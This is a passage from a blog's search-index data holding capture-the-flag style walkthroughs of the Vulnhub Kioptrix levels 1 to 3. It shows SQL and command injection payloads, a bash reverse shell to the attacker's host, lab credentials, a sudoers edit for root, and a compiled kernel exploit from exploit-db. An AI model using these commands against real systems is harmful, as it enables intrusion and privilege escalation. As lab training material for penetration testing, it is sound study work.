-c bash stty raw –echo; fg reset xterm export SHELL=bash export TERM=xterm stty rows \u003cnum\u003e columns \u003ccols\u003e After enumerating for a while we found the file gconfig.php in /home/www/kioptrix3.com/gallery which contains some credentials to the database. we log into mysql: mysql -uroot -pfuckeyou And we obtain the credentials of the admin user but after a few attempts it does not help us to change the user. We log into phpmyadmin with the credentials obtained previously. and locate the hashes of the machine’s users I have used an online website to crack these hashes by obtaining the password in clear text. https://crackstation.net/ Dreg loneferret dreg:Mast3r loneferret:starwars Once we have obtained the credentials we connect via SSH but we get an error. To solve it we write the following to connect: ssh -oHostKeyAlgorithms=+ssh-dss loneferret@192.168.66.161 ","date":"2023-08-25","objectID":"/en/kioptrix_level_3/:1:2","tags":["Walkthrough","Vulnhub","TjNull","OSCP","Easy"],"title":"Kioptrix Level 3 Walkthrough","uri":"/en/kioptrix_level_3/"},{"categories":["Vulnhub"],"content":"Privilege Escalation If we read the CompanyPolicy.README file it tells us that they have installed new software to edit, create and view files and to use the command “sudo ht”. With sudo -l we see that we have permissions to run it. if we execute it at first we will get an error so we have to execute the following: export TERM=xterm And run it: sudo ht To open a file, use the ALT+ F keys and select the open field: We are going to edit the file /etc/sudoers to be able to launch a shell as root and thus escalate privileges. To do this, type /etc/sudoers and hit enter. We add the following command followed by the existing commands to the user loneferret so that he can execute it with sudo. , bin/sh Press ALT + F to save and exit. We get a shell as root: loneferret@Kioptrix3:~$ sudo sh # whoami root Happy Hacking :) ","date":"2023-08-25","objectID":"/en/kioptrix_level_3/:1:3","tags":["Walkthrough","Vulnhub","TjNull","OSCP","Easy"],"title":"Kioptrix Level 3 Walkthrough","uri":"/en/kioptrix_level_3/"},{"categories":["Vulnhub"],"content":"Kioptrix Level 2 ","date":"2023-08-22","objectID":"/en/kioptrix_level_2/:0:0","tags":["Walkthrough","Vulnhub","TjNull","OSCP","Easy"],"title":"Kioptrix Level 2 Walkthrough","uri":"/en/kioptrix_level_2/"},{"categories":["Vulnhub"],"content":"Setup By default the machine has the network card configured in Bridged mode and it is not recommended so we must configure it in NAT mode which has to be the same interface as our Kali. To do this before opening the machine in our VMware we go to the configuration file. we open it with our text editor and change the network name to NAT #change ethernet0.networkName = \"Bridged\" #to ethernet0.networkName = \"NAT\" Then we open the machine from VMware and change the network interface to NAT. We start and a series of windows will appear in which we must select “Do Nothing” in all of them until the machine finishes starting. And we should have the machine ready to start. ","date":"2023-08-22","objectID":"/en/kioptrix_level_2/:1:0","tags":["Walkthrough","Vulnhub","TjNull","OSCP","Easy"],"title":"Kioptrix Level 2 Walkthrough","uri":"/en/kioptrix_level_2/"},{"categories":["Vulnhub"],"content":"Machine Resolution ","date":"2023-08-22","objectID":"/en/kioptrix_level_2/:2:0","tags":["Walkthrough","Vulnhub","TjNull","OSCP","Easy"],"title":"Kioptrix Level 2 Walkthrough","uri":"/en/kioptrix_level_2/"},{"categories":["Vulnhub"],"content":"Scanning and Vulnerability Analysis We start with a scan with the arp command to obtain the ip of our machine. sudo arp-scan -I eth0 --localnet Once we have obtained our IP address, we will perform a scan with nmap to discover open ports. nmap -p- --open -T5 -n -Pn -vvv 192.168.66.160 -oN Target Output: Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-20 16:30 EDT Initiating ARP Ping Scan at 16:30 Scanning 192.168.66.160 [1 port] Completed ARP Ping Scan at 16:30, 0.04s elapsed (1 total hosts) Initiating SYN Stealth Scan at 16:30 Scanning 192.168.66.160 [65535 ports] Discovered open port 111/tcp on 192.168.66.160 Discovered open port 3306/tcp on 192.168.66.160 Discovered open port 22/tcp on 192.168.66.160 Discovered open port 443/tcp on 192.168.66.160 Discovered open port 80/tcp on 192.168.66.160 Discovered open port 996/tcp on 192.168.66.160 Discovered open port 631/tcp on 192.168.66.160 Completed SYN Stealth Scan at 16:30, 4.05s elapsed (65535 total ports) Nmap scan report for 192.168.66.160 Host is up, received arp-response (0.0025s latency). Scanned at 2023-08-20 16:30:10 EDT for 4s Not shown: 65528 closed tcp ports (reset) PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 64 80/tcp open http syn-ack ttl 64 111/tcp open rpcbind syn-ack ttl 64 443/tcp open https syn-ack ttl 64 631/tcp open ipp syn-ack ttl 64 996/tcp open xtreelic syn-ack ttl 64 3306/tcp open mysql syn-ack ttl 64 MAC Address: 00:0C:29:60:3D:BB (VMware) Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 4.24 seconds Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB) After a general scan, we will perform another one specifying the ports discovered to see which version of the services are running. nmap -p22,80,111,443,631,996,3306 -sCV 192.168.66.160 Output: Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-20 16:31 EDT Nmap scan report for 192.168.66.160 Host is up (0.00015s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 3.9p1 (protocol 1.99) |_sshv1: Server supports SSHv1 | ssh-hostkey: | 1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1) | 1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA) |_ 1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA) 80/tcp open http Apache httpd 2.0.52 ((CentOS)) |_http-server-header: Apache/2.0.52 (CentOS) |_http-title: Site doesn't have a title (text/html; charset=UTF-8). 111/tcp open rpcbind 2 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2 111/tcp rpcbind | 100000 2 111/udp rpcbind | 100024 1 993/udp status |_ 100024 1 996/tcp status 443/tcp open ssl/http Apache httpd 2.0.52 ((CentOS)) |_http-title: Site doesn't have a title (text/html; charset=UTF-8). | ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=-- | Not valid before: 2009-10-08T00:10:47 |_Not valid after: 2010-10-08T00:10:47 |_ssl-date: 2023-08-20T17:22:36+00:00; -3h09m37s from scanner time. |_http-server-header: Apache/2.0.52 (CentOS) | sslv2: | SSLv2 supported | ciphers: | SSL2_RC2_128_CBC_WITH_MD5 | SSL2_RC4_64_WITH_MD5 | SSL2_DES_192_EDE3_CBC_WITH_MD5 | SSL2_RC4_128_EXPORT40_WITH_MD5 | SSL2_RC2_128_CBC_EXPORT40_WITH_MD5 | SSL2_DES_64_CBC_WITH_MD5 |_ SSL2_RC4_128_WITH_MD5 631/tcp open ipp CUPS 1.1 |_http-server-header: CUPS/1.1 |_http-title: 403 Forbidden | http-methods: |_ Potentially risky methods: PUT 996/tcp open status 1 (RPC #100024) 3306/tcp open mysql MySQL (unauthorized) MAC Address: 00:0C:29:60:3D:BB (VMware) Host script results: |_clock-skew: -3h09m37s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 21.28 seconds ","date":"2023-08-22","objectID":"/en/kioptrix_level_2/:2:1","tags":["Walkthrough","Vulnhub","TjNull","OSCP","Easy"],"title":"Kioptrix Level 2 Walkthrough","uri":"/en/kioptrix_level_2/"},{"categories":["Vulnhub"],"content":"Explotation After analyzing the result we see that port 80 is open with the http service, so we go to see the web. We observe a login with Username and Password fields. Let’s try to perform a basic SQLInjection command on the Username field. ' or 1 = 1 -- - And we are successful and the following window appears: We observe that it has the function of pinging the ip that we indicate. If we write the ip of the machine we obtain the following: We try to concatenate commands with a “;” and see that they can be concatenated: 192.168.66.160 ; whoami result: Once here, we listen to our kali and execute the following command to get a reverse Shell #kali nc -nlvp 4444 #En la web 192.168.66.152 ; bash -i \u003e\u0026 /dev/tcp/192.168.66.152/4444 0\u003e\u00261 result: ┌──(kali㉿kali)-[~] └─$ nc -nlvp 4444 listening on [any] 4444 ... connect to [192.168.66.152] from (UNKNOWN) [192.168.66.160] 32779 bash: no job control in this shell bash-3.00$ whoami apache ","date":"2023-08-22","objectID":"/en/kioptrix_level_2/:2:2","tags":["Walkthrough","Vulnhub","TjNull","OSCP","Easy"],"title":"Kioptrix Level 2 Walkthrough","uri":"/en/kioptrix_level_2/"},{"categories":["Vulnhub"],"content":"Privilege Escalation We transfer linpeas.sh from our Kali to the machine to see where we can escalate privileges, for this we start a server with Python in our Kali: python3 -m http.server 80 and with wget from the machine we download Linpeas. wget http://192.168.66.152/linpeas.sh Once we have Linpeas on the target machine we run it and we see the following: The machine is a CentOS 4.5 with Linux version 2.6.9. We searched Google to see if there is a privilege escalation exploit with these characteristics and found the following exploit: https://www.exploit-db.com/exploits/9542 We download it to our machine and transfer it as we have done before. Compile it gcc 9542.c -o exploit We give execution permissions chmod +x exploit and run it getting a shell as root bash-3.00$ ./exploit sh: no job control in this shell sh-3.00# whoami root and we would have the machine finished. Best regards and Happy Hacking :) ","date":"2023-08-22","objectID":"/en/kioptrix_level_2/:2:3","tags":["Walkthrough","Vulnhub","TjNull","OSCP","Easy"],"title":"Kioptrix Level 2 Walkthrough","uri":"/en/kioptrix_level_2/"},{"categories":["Vulnhub"],"content":"Kioptrix: Level 1 ","date":"2023-08-14","objectID":"/en/kioptrix_level_1/:0:0","tags":["Walkthrough","Vulnhub","TjNull","OSCP","Easy"],"title":"Kioptrix Level 1 Walkthrough","uri":"/en/kioptrix_level_1/"},{"categories":["Vulnhub"],"content":"Install if we start the machine by default the network card is in brigded mode and this is not at all recommended so we must change it to NAT mode for this we must go to the configuration file located in the folder of the machine. Look for where it says Brigded and change it to NAT #change ethernet0.networkName = \"Bridged\" #to ethernet0.networkName = \"NAT\" Then we configure our network card as NAT and start. ","date":"2023-08-14","objectID":"/en/kioptrix_level_1/:1:0","tags":["Walkthrough","Vulnhub","TjNull","OSCP","Easy"],"title":"Kioptrix Level 1 Walkthrough","uri":"/en/kioptrix_level_1/"},{"categories":["Vulnhub"],"content":"Machine resolution ","date":"2023-08-14","objectID":"/en/kioptrix_level_1/:2:0","tags":["Walkthrough","Vulnhub","TjNull","OSCP","Easy"],"title":"Kioptrix Level 1 Walkthrough","uri":"/en/kioptrix_level_1/"},{"categories":["Vulnhub"],"content":"Vulnerability scan We start with a scan of the local network through arp-scan. We introduce the interface (eth0) that communicates with the Kioptrix machine. arp-scan -I eth0 --localnet Next we perform a scan with nmap. nmap -p- --open -T5 -n -Pn -vvv 192.168.66.158 -oN Target After a first scan, we will perform another scan to check the version of the open port services. nmap -p22,80,111,139,443,1024 -sCV 192.168.66.158 Output: Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-10 17:57 EDT Nmap scan report for 192.168.66.158 Host is up (0.00024s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 2.9p2 (protocol 1.99) |_sshv1: Server supports SSHv1 | ssh-hostkey: | 1024 b8746cdbfd8be666e92a2bdf5e6f6486 (RSA1) | 1024 8f8e5b81ed21abc180e157a33c85c471 (DSA) |_ 1024 ed4ea94a0614ff1514ceda3a80dbe281 (RSA) 80/tcp open http Apache httpd 1.3.20 ((Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b) |_http-server-header: Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b |_http-title: Test Page for the Apache Web Server on Red Hat Linux | http-methods: |_ Potentially risky methods: TRACE 111/tcp open rpcbind 2 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2 111/tcp rpcbind | 100000 2 111/udp rpcbind | 100024 1 1024/tcp status |_ 100024 1 1024/udp status 139/tcp open netbios-ssn Samba smbd (workgroup: MYGROUP) 443/tcp open ssl/https Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b |_ssl-date: 2023-08-10T22:00:06+00:00; +1m50s from scanner time. |_http-title: 400 Bad Request |_http-server-header: Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b | sslv2: | SSLv2 supported | ciphers: | SSL2_DES_192_EDE3_CBC_WITH_MD5 | SSL2_RC2_128_CBC_WITH_MD5 | SSL2_RC4_128_WITH_MD5 | SSL2_RC2_128_CBC_EXPORT40_WITH_MD5 | SSL2_DES_64_CBC_WITH_MD5 | SSL2_RC4_128_EXPORT40_WITH_MD5 |_ SSL2_RC4_64_WITH_MD5 | ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=-- | Not valid before: 2009-09-26T09:32:06 |_Not valid after: 2010-09-26T09:32:06 1024/tcp open status 1 (RPC #100024) MAC Address: 00:0C:29:7C:3A:16 (VMware) Host script results: |_clock-skew: 1m49s |_smb2-time: Protocol negotiation failed (SMB2) |_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: \u003cunknown\u003e, NetBIOS MAC: 000000000000 (Xerox) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 29.02 seconds We notice that it has ports 80 and 443 open, and that it has a version of apache 1.3.20 with a mod_ssl version of 2.8.4. We go on to see the webs with the browser http://192.168.66.158 After a review of the website and its source code we found nothing of interest so we went on to review the website with port 443. http://192.168.66.158:443 nothing interesting is visible either. Next I performed a brute force attack on directories with gobuster. gobuster dir -u \"http://192.168.66.158/\" -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt Output: =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://192.168.66.158/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/08/10 17:55:28 Starting gobuster in directory enumeration mode =============================================================== /manual (Status: 301) [Size: 294] [--\u003e http://127.0.0.1/manual/] /usage (Status: 301) [Size: 293] [--\u003e http://127.0.0.1/usage/] /mrtg (Status: 301) [Size: 292] [--\u003e http://127.0.0.1/mrtg/] Progress: 219977 / 220561 (99.74%) ==========================================","date":"2023-08-14","objectID":"/en/kioptrix_level_1/:2:1","tags":["Walkthrough","Vulnhub","TjNull","OSCP","Easy"],"title":"Kioptrix Level 1 Walkthrough","uri":"/en/kioptrix_level_1/"},{"categories":["Vulnhub"],"content":"Explotation We run the exploit ./OpenFuck Output ./OpenFuck ******************************************************************* * OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open * ******************************************************************* * by SPABAM with code of Spabam - LSD-pl - SolarEclipse - CORE * * #hackarena irc.brasnet.org * * TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname * * #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam * * #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ * ******************************************************************* : Usage: ./OpenFuckV2 target box [port] [-c N] target - supported box eg: 0x00 box - hostname or IP address port - port for ssl connection -c open N connections. (use range 40-50 if u dont know) Supported OffSet: 0x00 - Caldera OpenLinux (apache-1.3.26) 0x01 - Cobalt Sun 6.0 (apache-1.3.12) 0x02 - Cobalt Sun 6.0 (apache-1.3.20) 0x03 - Cobalt Sun x (apache-1.3.26) 0x04 - Cobalt Sun x Fixed2 (apache-1.3.26) 0x05 - Conectiva 4 (apache-1.3.6) 0x06 - Conectiva 4.1 (apache-1.3.9) 0x07 - Conectiva 6 (apache-1.3.14) 0x08 - Conectiva 7 (apache-1.3.12) 0x09 - Conectiva 7 (apache-1.3.19) 0x0a - Conectiva 7/8 (apache-1.3.26) 0x0b - Conectiva 8 (apache-1.3.22) 0x0c - Debian GNU Linux 2.2 Potato (apache_1.3.9-14.1) 0x0d - Debian GNU Linux (apache_1.3.19-1) 0x0e - Debian GNU Linux (apache_1.3.22-2) 0x0f - Debian GNU Linux (apache-1.3.22-2.1) 0x10 - Debian GNU Linux (apache-1.3.22-5) 0x11 - Debian GNU Linux (apache_1.3.23-1) 0x12 - Debian GNU Linux (apache_1.3.24-2.1) 0x13 - Debian Linux GNU Linux 2 (apache_1.3.24-2.1) 0x14 - Debian GNU Linux (apache_1.3.24-3) 0x15 - Debian GNU Linux (apache-1.3.26-1) 0x16 - Debian GNU Linux 3.0 Woody (apache-1.3.26-1) 0x17 - Debian GNU Linux (apache-1.3.27) 0x18 - FreeBSD (apache-1.3.9) 0x19 - FreeBSD (apache-1.3.11) 0x1a - FreeBSD (apache-1.3.12.1.40) 0x1b - FreeBSD (apache-1.3.12.1.40) 0x1c - FreeBSD (apache-1.3.12.1.40) 0x1d - FreeBSD (apache-1.3.12.1.40_1) 0x1e - FreeBSD (apache-1.3.12) 0x1f - FreeBSD (apache-1.3.14) 0x20 - FreeBSD (apache-1.3.14) 0x21 - FreeBSD (apache-1.3.14) 0x22 - FreeBSD (apache-1.3.14) 0x23 - FreeBSD (apache-1.3.14) 0x24 - FreeBSD (apache-1.3.17_1) 0x25 - FreeBSD (apache-1.3.19) 0x26 - FreeBSD (apache-1.3.19_1) 0x27 - FreeBSD (apache-1.3.20) 0x28 - FreeBSD (apache-1.3.20) 0x29 - FreeBSD (apache-1.3.20+2.8.4) 0x2a - FreeBSD (apache-1.3.20_1) 0x2b - FreeBSD (apache-1.3.22) 0x2c - FreeBSD (apache-1.3.22_7) 0x2d - FreeBSD (apache_fp-1.3.23) 0x2e - FreeBSD (apache-1.3.24_7) 0x2f - FreeBSD (apache-1.3.24+2.8.8) 0x30 - FreeBSD 4.6.2-Release-p6 (apache-1.3.26) 0x31 - FreeBSD 4.6-Realease (apache-1.3.26) 0x32 - FreeBSD (apache-1.3.27) 0x33 - Gentoo Linux (apache-1.3.24-r2) 0x34 - Linux Generic (apache-1.3.14) 0x35 - Mandrake Linux X.x (apache-1.3.22-10.1mdk) 0x36 - Mandrake Linux 7.1 (apache-1.3.14-2) 0x37 - Mandrake Linux 7.1 (apache-1.3.22-1.4mdk) 0x38 - Mandrake Linux 7.2 (apache-1.3.14-2mdk) 0x39 - Mandrake Linux 7.2 (apache-1.3.14) 2 0x3a - Mandrake Linux 7.2 (apache-1.3.20-5.1mdk) 0x3b - Mandrake Linux 7.2 (apache-1.3.20-5.2mdk) 0x3c - Mandrake Linux 7.2 (apache-1.3.22-1.3mdk) 0x3d - Mandrake Linux 7.2 (apache-1.3.22-10.2mdk) 0x3e - Mandrake Linux 8.0 (apache-1.3.19-3) 0x3f - Mandrake Linux 8.1 (apache-1.3.20-3) 0x40 - Mandrake Linux 8.2 (apache-1.3.23-4) 0x41 - Mandrake Linux 8.2 #2 (apache-1.3.23-4) 0x42 - Mandrake Linux 8.2 (apache-1.3.24) 0x43 - Mandrake Linux 9 (apache-1.3.26) 0x44 - RedHat Linux ?.? GENERIC (apache-1.3.12-1) 0x45 - RedHat Linux TEST1 (apache-1.3.12-1) 0x46 - RedHat Linux TEST2 (apache-1.3.12-1) 0x47 - RedHat Linux GENERIC (marumbi) (apache-1.2.6-5) 0x48 - RedHat Linux 4.2 (apache-1.1.3-3) 0x49 - RedHat Linux 5.0 (apache-1.2.4-4) 0x4a - RedHat Linux 5.1-Update (apache-1.2.6) 0x4b - RedHat Linux 5.1 (apache-1.2.6-4) 0x4c - RedHat Linux 5.2 (apache-1.3.3-1) 0x4d - RedHat Linux 5.2-Update (apache-1.3.14-2.5.x) 0x4e - RedHat Linux 6.0 (apache-1.3.6","date":"2023-08-14","objectID":"/en/kioptrix_level_1/:2:2","tags":["Walkthrough","Vulnhub","TjNull","OSCP","Easy"],"title":"Kioptrix Level 1 Walkthrough","uri":"/en/kioptrix_level_1/"}]